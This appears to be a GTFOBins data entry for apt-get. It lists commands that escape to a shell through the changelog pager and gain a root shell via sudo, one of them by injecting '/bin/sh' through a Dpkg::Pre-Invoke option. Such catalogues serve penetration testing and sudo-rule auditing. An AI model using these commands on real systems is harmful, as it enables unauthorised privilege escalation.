---
functions:
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        apt-get changelog apt
        !/bin/sh
  sudo:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo apt-get changelog apt
        !/bin/sh
    - description: For this to work the target package (e.g., `sl`) must not be installed.
      code: sudo apt-get install -c <(echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}') sl
---
